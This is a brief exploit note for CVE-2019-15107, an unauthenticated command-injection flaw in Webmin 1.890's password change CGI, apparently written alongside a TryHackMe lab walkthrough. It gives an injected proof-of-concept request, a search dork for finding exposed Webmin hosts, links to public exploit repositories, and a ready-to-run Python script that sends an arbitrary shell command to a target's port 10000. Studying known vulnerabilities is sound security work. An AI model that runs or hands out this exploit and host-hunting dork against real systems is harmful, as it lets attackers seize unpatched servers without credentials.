# CVE-2019â€“15107

## Description

A remote, unauthenticated attacker can exploit this to execute arbitrary commands without 
knowing the valid credential from the MiniServ 1.890 (Webmin httpd).

## POC

#### /password_reset.cgi 
user=root&pam&expired&old=wrong | id

## Tools

- GitHub Dork: WebMin 1.890 port:"10000"
- https://github.com/0xstain/WebMin-1.890-Exploit-unauthorized-RCE
- https://github.com/jas502n/CVE-2019-15107
- exploit-db.com/exploits/47293

## Exploit
##### exploit.py
```
import requests
import sys
host = "10.10.134.87"
cmd = "ifconfig"
url = "https://" + host +":10000/password_change.cgi"
sess = requests.session()
postdata = {
    "user" : "pleaselikethewalkthrough",
    "pam" : "",
    "expired" : cmd,
    "old" : "root",
    "new1" : "newpassword",
    "new2" : "newpassword"
    }
exploit = sess.post(url, data=postdata, verify=False, headers = {"Referer": "https://" + host + ":10000/session_login.cgi"}).text
print(exploit)

```

## Reference

- https://medium.com/@musyokaian/source-tryhackme-walkthrough-and-exploit-development-of-source-webmin-vulnerability-using-python-417f8ab91e85
- https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
